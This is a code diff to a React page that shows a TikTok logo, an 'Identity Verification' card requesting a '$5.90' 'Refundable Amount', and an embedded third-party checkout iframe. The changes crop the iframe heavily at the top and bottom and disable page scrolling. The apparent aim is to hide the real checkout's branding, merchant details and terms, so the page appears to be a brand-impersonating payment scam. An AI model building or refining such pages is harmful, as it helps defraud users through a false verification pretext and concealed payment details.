@@ -1,10 +1,11 @@
-import { useRef } from "react";
+import { useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 
 const CHECKOUT_BASE_URL = "https://checkout.cooud.com/01KH52NHC02W9XP6SGHQ1DAMXK";
 
 const TOP_CROP = 302;
+const BOTTOM_CROP = 9500;
 
 const Index = () => {
   const [searchParams] = useSearchParams();
@@ -15,12 +16,24 @@ const Index = () => {
     return params ? `${CHECKOUT_BASE_URL}?${params}` : CHECKOUT_BASE_URL;
   })();
 
+  useEffect(() => {
+    document.body.style.overflow = "hidden";
+    document.documentElement.style.overflow = "hidden";
+    return () => {
+      document.body.style.overflow = "";
+      document.documentElement.style.overflow = "";
+    };
+  }, []);
+
   return (
     <div
       ref={containerRef}
       style={{
+        position: "fixed",
+        inset: 0,
+        overflow: "hidden",
         width: "100vw",
-        minHeight: "100vh",
+        height: "100vh",
         display: "flex",
         flexDirection: "column",
         backgroundColor: "#f5f5f5",
@@ -40,11 +53,18 @@ const Index = () => {
           borderBottom: "1px solid #eee",
         }}
       >
+        {/* Logo TikTok */}
         <img
           src={tiktokLogo}
           alt="TikTok"
-          style={{ height: "32px", objectFit: "contain", marginBottom: "24px" }}
+          style={{
+            height: "32px",
+            objectFit: "contain",
+            marginBottom: "24px",
+          }}
         />
+
+        {/* Card de resumo */}
         <div
           style={{
             width: "90%",
@@ -61,13 +81,27 @@ const Index = () => {
               fontWeight: 600,
               letterSpacing: "0.08em",
               color: "#6b7280",
-              textTransform: "uppercase",
+              textTransform: "uppercase" as const,
             }}
           >
             Identity Verification
           </span>
-          <div style={{ display: "flex", alignItems: "center", gap: "12px", marginTop: "10px" }}>
-            <span style={{ fontSize: "28px", fontWeight: 700, color: "#111", letterSpacing: "-0.02em" }}>
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              gap: "12px",
+              marginTop: "10px",
+            }}
+          >
+            <span
+              style={{
+                fontSize: "28px",
+                fontWeight: 700,
+                color: "#111",
+                letterSpacing: "-0.02em",
+              }}
+            >
               $5.90
             </span>
             <span
@@ -79,7 +113,7 @@ const Index = () => {
                 backgroundColor: "#ecfdf5",
                 padding: "4px 10px",
                 borderRadius: "20px",
-                textTransform: "uppercase",
+                textTransform: "uppercase" as const,
               }}
             >
               Refundable Amount
@@ -88,12 +122,11 @@ const Index = () => {
         </div>
       </div>
 
-      {/* Iframe do checkout - rolagem livre */}
+      {/* Iframe do checkout */}
       <div
         style={{
           position: "relative",
-          width: "100%",
-          height: "2000px",
+          flex: 1,
           overflow: "hidden",
         }}
       >
@@ -105,7 +138,7 @@ const Index = () => {
             top: `-${TOP_CROP}px`,
             left: 0,
             width: "100%",
-            height: `calc(100% + ${TOP_CROP}px)`,
+            height: `calc(100% + ${TOP_CROP + BOTTOM_CROP}px)`,
             border: "none",
           }}
           allow="payment *; clipboard-write"
